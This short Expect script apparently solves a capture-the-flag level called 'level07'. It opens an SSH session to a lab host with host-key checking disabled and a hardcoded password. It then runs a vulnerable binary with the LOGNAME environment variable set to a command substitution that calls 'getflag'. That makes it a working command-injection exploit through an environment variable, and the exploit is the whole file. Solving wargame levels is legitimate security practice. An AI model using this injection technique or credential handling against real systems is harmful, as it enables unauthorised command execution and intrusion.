#!/usr/bin/expect -f
set ip 192.168.1.103
spawn ssh -o "StrictHostKeyChecking no" level07@$ip -p 4242 "LOGNAME=\$\\\(getflag\\\) ; ./level07"
expect "sword:"
send "wiok45aaoguiboiki2tuin6ub\r"
interact
